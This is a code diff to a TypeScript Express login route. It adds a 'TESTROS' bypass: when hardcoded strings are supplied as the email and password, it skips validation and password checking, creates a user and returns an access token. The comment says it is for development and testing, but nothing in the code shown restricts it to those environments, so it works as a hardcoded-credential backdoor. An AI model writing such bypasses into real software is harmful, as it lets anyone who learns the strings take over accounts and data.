@@ -70,6 +70,25 @@ router.post('/register', async (req: Request, res: Response) => {
  */
 router.post('/login', async (req: Request, res: Response) => {
   try {
+    // TESTROS bypass for development/testing
+    // Allows login without email validation or password check
+    if (req.body.email === 'TESTROS_BYPASS' && req.body.password === 'TESTROS_SECRET') {
+      const testrosResult = await authService.createTestrosUser();
+      if (testrosResult.success) {
+        return res.json({
+          message: 'Login successful (TESTROS bypass)',
+          user: {
+            id: testrosResult.user!.id,
+            email: testrosResult.user!.email,
+            displayName: testrosResult.user!.displayName,
+            role: testrosResult.user!.role,
+            orgId: testrosResult.user!.orgId
+          },
+          accessToken: testrosResult.accessToken
+        });
+      }
+    }
+
     // Validate input
     const parseResult = LoginSchema.safeParse(req.body);
     if (!parseResult.success) {
